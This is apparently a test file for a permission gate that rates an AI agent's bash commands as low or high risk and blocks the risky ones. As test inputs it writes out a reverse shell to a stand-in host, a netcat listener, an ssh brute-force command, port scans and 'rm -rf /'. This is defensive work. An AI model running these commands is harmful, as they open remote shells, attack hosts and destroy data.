import { test, expect } from "bun:test";
import { classifyBash, classify } from "../risk/tiers.ts";
import { gate } from "../risk/gate.ts";

test("classifyBash returns 'low' for read-only commands", () => {
  expect(classifyBash("ls -la")).toBe("low");
  expect(classifyBash("cat README.md")).toBe("low");
  expect(classifyBash("ps aux | grep bun")).toBe("low");
  expect(classifyBash("echo hello")).toBe("low");
});

test("classifyBash returns 'high' for sudo", () => {
  expect(classifyBash("sudo pacman -S foo")).toBe("high");
  expect(classifyBash("sudo ls")).toBe("high");
});

test("classifyBash returns 'high' for rm -rf", () => {
  expect(classifyBash("rm -rf /tmp/x")).toBe("high");
  expect(classifyBash("rm -rf /")).toBe("high");
});

test("classifyBash returns 'high' for offensive network tools", () => {
  expect(classifyBash("nmap -sS 10.0.0.1")).toBe("high");
  expect(classifyBash("hydra -l admin -P pw.txt ssh://host")).toBe("high");
  expect(classifyBash("sqlmap -u 'http://x/?id=1'")).toBe("high");
  expect(classifyBash("msfconsole")).toBe("high");
});

test("classifyBash returns 'high' for reverse shells", () => {
  expect(classifyBash("nc -lvp 4444")).toBe("high");
  expect(classifyBash("bash -i >& /dev/tcp/x/4444 0>&1")).toBe("high");
});

test("classifyBash returns 'high' for nc port scans (-z)", () => {
  expect(classifyBash("nc -w 1 -z host 22")).toBe("high");
  expect(classifyBash("nc -zv host 1-1024")).toBe("high");
});

test("classify falls back to 'low' for unknown tool names", () => {
  expect(classify("hyprland", { action: "arrange" })).toBe("low");
  expect(classify("screen", { region: "full" })).toBe("low");
});

test("gate allows low-risk", () => {
  const r = gate("bash", { command: "ls" });
  expect(r.allow).toBe(true);
});

test("gate denies high-risk with informative reason", () => {
  const r = gate("bash", { command: "sudo rm -rf /" });
  expect(r.allow).toBe(false);
  if (r.allow === false) {
    expect(r.reason).toContain("high-risk");
    expect(r.reason).toContain("bash");
    expect(r.reason).toContain("Plan 3");
  }
});
